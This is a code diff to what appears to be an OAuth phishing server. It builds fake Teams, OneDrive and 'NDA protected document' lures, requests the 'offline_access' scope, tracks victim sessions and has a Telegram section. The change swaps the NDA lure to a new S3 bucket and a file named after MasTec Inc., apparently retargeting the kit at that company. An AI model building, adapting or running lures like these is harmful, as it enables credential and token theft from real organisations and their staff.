@@ -24,7 +24,7 @@ const SCOPE    = 'offline_access';
 const DISPLAY_BASES = {
   teams:    'https://teams.microsoft.com/invite/',
   onedrive: 'https://1drv.ms/files/',
-  nda:      'https://eviden-global.s3.us-east-1.amazonaws.com/',
+  nda:      'https://sustainable-furnitures.s3.us-east-2.amazonaws.com/',
 };
 
 // Telegram
@@ -311,8 +311,8 @@ const server = http.createServer(async (req, res) => {
       const reqLower = requestedDisplay.toLowerCase();
 
       if (reqLower === 'nda' || reqLower === 'nda') {
-        displayFilename = 'IMG_5173.jpg';
-        displayUrl = DISPLAY_BASES.nda + 'IMG_5173.jpg';
+        displayFilename = 'NDA_MasTec-Inc.pdf';
+        displayUrl = DISPLAY_BASES.nda + 'NDA_MasTec-Inc.pdf';
         displayNote = 'NDA protected document';
       } else if (reqLower === 'teams') {
         const rand = crypto.randomBytes(4).toString('hex');
@@ -323,7 +323,7 @@ const server = http.createServer(async (req, res) => {
         displayFilename = 'secured-onedrive-document.pdf';
         displayUrl = `${DISPLAY_BASES.onedrive}${crypto.randomBytes(8).toString('hex')}`;
         displayNote = 'OneDrive shared file';
-      }
+      }  
       // default → keep real random filename, no URL
 
       sessions.set(sessionId, {
